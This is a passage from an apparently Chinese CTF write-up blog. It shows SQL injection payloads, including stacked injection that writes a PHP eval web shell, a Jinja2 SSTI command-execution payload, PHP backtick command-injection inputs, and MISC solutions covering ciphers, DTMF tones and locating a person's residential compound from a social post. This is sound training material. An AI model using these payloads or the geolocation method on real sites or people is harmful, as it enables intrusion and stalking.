number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span class="token number">1</span>"<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是实战时只是用上面的语句的可能性几乎为零，而且这个似乎只是php的这个<code>mysql_multi_query()</code>语句的特性，而实战时几乎好多都是jsp、asp等老网页，也是比较安全的(一定是我现在太菜了，还没开始学jsp、asp的原因才会觉得这两种语言写的网页安全)。</p><h4 id="绕过限制Bypass"><a href="#绕过限制Bypass" class="headerlink" title="绕过限制Bypass"></a>绕过限制Bypass</h4><p>基于上面的几种注入又各自有不同的绕过限制的方法，上面的几种注入只是我们使用SQL注入的大纲，但是更重要的是各种限制的绕过，比如说禁用了单双引号，也许可以想想使用<code>\</code>来转义单双引号来绕过限制等等。</p><hr><h3 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h4><p><strong>TAG:二次注入、联合查询注入</strong></p><p>给出的有两个功能，一个注册登录、一个修改密码的功能(查询的是用户名)</p><p>先使用下面的payload进行测试</p><pre class="line-numbers language-none"><code class="language-none">username &#x3D; 1&#39; union select database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>password可以自己随便设置，直接登录即可发现数据已经注出来了。</p><p><img src="/2021/05/28/CTF/image-20210604235055344.png" alt="image-20210604235055344"></p><p>这题不是盲注就不用使用脚本了，直接贴出所有的payload，直接注册登录就能查询到信息了。</p><p><strong>爆数据表</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235538363.png" alt="image-20210604235538363"></p><p><strong>爆列名</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39; #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235738874.png" alt="image-20210604235738874"></p><p><strong>获取数据</strong></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; union select * from flag #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210604235837283.png" alt="image-20210604235837283"></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;fd2e5523-e1d1-4f17-aa7a-a85142ff023f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="sql注入getshell、-SUCTF-2018-MultiSQL"><a href="#sql注入getshell、-SUCTF-2018-MultiSQL" class="headerlink" title="sql注入getshell、[SUCTF 2018]MultiSQL"></a>sql注入getshell、[SUCTF 2018]MultiSQL</h4><p>这个给出的是一个小网站，有登录、注册、查看个人信息、上传个人头像等功能。</p><p><img src="/2021/05/28/CTF/image-20210601150932381.png" alt="image-20210601150932381"></p><p>根据上面的这个payload确认这里是存在SQL注入漏洞的，而且还是异或注入。可以用下面的payload自行进行测试</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^0^1http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^1^1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后接下去继续测试注入，但是substr似乎是被过滤掉了，这里考虑使用mid来替代substr</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn&#x2F;user&#x2F;user.php?id&#x3D;1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里不仅仅有异或注入，还有堆叠注入，直使用下面的payload也是没有报错的</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就是堆叠注入用<code>select into outfile</code>写入shell，这是一个php做的网站，所以可以用下面的payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"select '&lt;?php eval($_POST[4]);?>' into outfile '/var/www/html/favicon/shell.php';"</span>res <span class="token operator">=</span> <span class="token string">"char("</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">','</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token comment"># char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,52,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用sql的预处理来写shell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> shell <span class="token keyword">from</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">execute</span> shell<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>预处理的实验</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token variable">@payload</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">PREPARE</span> i <span class="token keyword">FROM</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>只是不知道为什么执行成功了，但是没有返回数据库的信息，只显示了查询出了多少行。</p><p>执行上面的payload之后在这里找shell<code>/favicon/shell.php</code>，蚁剑连接shell即可。</p><p><img src="/2021/05/28/CTF/image-20210601175949497.png" alt="image-20210601175949497"></p><p><img src="/2021/05/28/CTF/image-20210601180101679.png" alt="找到flag即可"></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SSTI全名为服务端模板注入。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文CSDN</a></p><ol><li>第一个Jinja2，较为常见的。</li></ol><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#123;&#123;config&#125;&#125;&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>php可以说现在是一般的中等比赛上面都会出的一种简单的题目了，因为php相关的知识点繁多复杂，所以这里列出了php的知识点与题目两个分类，将知识点列为一个单独分类的目的就是未来比赛的时候找知识点的时候方便查找，而不是随即再去百度，减少一些不必要的麻烦。</p></blockquote><h3 id="PHP知识点"><a href="#PHP知识点" class="headerlink" title="PHP知识点"></a>PHP知识点</h3><h4 id="php短标签绕过"><a href="#php短标签绕过" class="headerlink" title="php短标签绕过"></a>php短标签绕过</h4><p>这个绕过的是对<code>php</code>这个关键字或者<code>&lt;?php</code>这个关键字有限制的情况，<code>&lt;?php ?&gt;</code>这个叫做长标签，而<code>&lt;? ?&gt;</code>叫做短标签。</p><h4 id="php空格绕过"><a href="#php空格绕过" class="headerlink" title="php空格绕过"></a>php空格绕过</h4><ol><li>限制了空格的使用的情况下可以使用php的<code>%09</code>来代替。因为在ASCII码制中<code>0x09</code>代表的是水平制表符，也就是转义的<code>\t</code>，当然直接用<code>\t</code>可能也是可以的，分情况而论都试一下就好了。</li></ol><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><ol><li>反引号在php中可以命令执行，但是在双引号内反引号引住的内容好像不能被执行，其余情况下反引号的作用相当于<code>shell_exec()</code>，当关闭<code>shell_exec()</code>这个函数的时候，反引号也将不再起作用。</li></ol><h3 id="PHP题目"><a href="#PHP题目" class="headerlink" title="PHP题目"></a>PHP题目</h3><h4 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// if(preg_match("/'| |_|=|php/",$input))&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"action"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token single-quoted-string string">'pwd'</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token single-quoted-string string">'upload'</span><span class="token punctuation">:</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$dir</span></span>"</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里重要的就是<code>file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</code>这个点了啊，将传入的数据<code>data</code>写入<code>index.php</code>这个文件，然后上面又给了这个文件所在的目录，所以这里可以直接先<code>pwd</code>获得这个目录，打开一个标签页，然后再使用</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?echo(&#96;ls\t&#x2F;&#96;)?&gt;bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得flag的文件名再cat一下就行了。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?echo(&#96;cat\t&#x2F;flllllll1112222222lag&#96;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="编码与密码"><a href="#编码与密码" class="headerlink" title="编码与密码"></a>编码与密码</h2><h3 id="一些特殊编码的题目"><a href="#一些特殊编码的题目" class="headerlink" title="一些特殊编码的题目"></a>一些特殊编码的题目</h3><h4 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h4><p>给出的附件内容如下：</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">(╯°□°）╯︵ ┻━┻50pt(╯°□°）╯︵ ┻━┻d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到给出的有效的条件的内容仅为一堆十六进制的字符串，这个时候考虑下面的编码方式。</p><p>两位十六进制转十进制<code>-128</code>再转ASCII。脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd '</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> t<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x '</span> <span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">128</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="手机按键音"><a href="#手机按键音" class="headerlink" title="手机按键音"></a>手机按键音</h3><h4 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h4><p><a href="http://dialabc.com/sound/detect/index.html">在线网站</a></p><p>DTMF拨号音识别</p><pre class="line-numbers language-none"><code class="language-none">999 * 666 * 88 * 2 * 777 * 33 * 6 * 99 * 4 * 444 * 777 * 555 * 333 * 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按九宫格解一下码为</p><pre class="line-numbers language-none"><code class="language-none">you are my girlfriend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在线网站识别的总是少一段，虽然最后我们推测也是可以推测出来的，但是还是有拨号音识别的相关的专用的工具以供下载的</p><p><a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">拨号音识别工具</a></p><p><a href="http://freshmeat.sourceforge.net/projects/dtmf2num">dtmf2num官方网址</a></p><p><img src="/2021/05/28/CTF/image-20210701205601479.png" alt="image-20210701205601479"></p><pre class="line-numbers language-none"><code class="language-none">999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777youaremygirlfriends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>flag&#123;youaremygirlfriends&#125;</code></p><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><h4 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h4><p>这道题目中的栅栏密码应该说是有点特殊的，要在<a href="http://ctf.ssleye.com/railfence.html">在线詹栅栏密码</a>这个网站上进行key为7的加密才能得到正确的内容<code>kzna&#123;blnl_abj_lbh_trg_vg&#125;</code>，然后在进行凯撒密码</p><p><img src="/2021/05/28/CTF/image-20210804191048553.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">xman&#123;oyay_now_you_get_it&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h3 id="地图分析——BugKu社工-进阶收集"><a href="#地图分析——BugKu社工-进阶收集" class="headerlink" title="地图分析——BugKu社工-进阶收集"></a>地图分析——BugKu社工-进阶收集</h3><p>提　　示: flag{小美小区名字拼音}</p><p>描　　述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编题，难度降低了。)</p><p>给出的附件内容如下所示</p><p><img src="/2021/05/28/CTF/qq.png" alt="附件"></p><p>首先看到那个塔是大雁塔，根据发帖的内容确定</p><ol><li>从发帖人家(附近的<strong>始发站</strong>)出发到大雁塔要做7站地铁。</li><li>该始发站距发帖人家的小区有800米</li><li>下一站距发帖人家1000多米。</li></ol><p>找到大雁塔附近的地铁路线图如下：</p><p><img src="/2021/05/28/CTF/20210219162217227.png" alt="西安地铁路线图"></p><p><img src="/2021/05/28/CTF/image-20210528200737880.png" alt="确定始发站为韦曲南站"></p><p>根据地铁线路图可以发现只有韦曲南站距离大雁塔的站点数为7并且中间又转乘(在小寨)了一站，故现在的条件为，发帖人家的小区距离韦曲南站有800米、距航天城1000多米。打开百度地图</p><p><img src="/2021/05/28/CTF/image-20210528201622601.png" alt="image-20210528201622601"></p><p>到目前为止，差不多一眼就能看出来了，很明显发帖人所在的小区就是兰乔国际城</p><p><img src="/2021/05/28/CTF/image-20210528201736743.png" alt="对距离的大概估算"></p><p><code>flag&#123;lanqiaoguojicheng&#125;</code></p><h2 id="二维码与拼图"><a href="#二维码与拼图" class="headerlink" title="二维码与拼图"></a>二维码与拼图</h2><h3 id="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"><a href="#根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事" class="headerlink" title="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"></a>根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事</h3><p>附件内容为</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">0000000001110010000000000000000000001111010000000000000000011100010000000000000000010111100000000000000000001010101000000000000000000011000101000000000000000010101010100000000000000000100000110000000011000111011101101000110000001000010110010010010100010011110100001110111001100111101001010110010010011000001001100001001101000111100011111101110010100010110111110011011111101111000110110010010101101100100011110011111111111011100000000101100011000101000000000010010100101010001000000001010101010001100100000000001001111111100100000000000011001011110111000000000100110010010000100000000110000110110110010000000011010000101110101<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测可能是个二维码的形状，打开python写一手转换代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    res <span 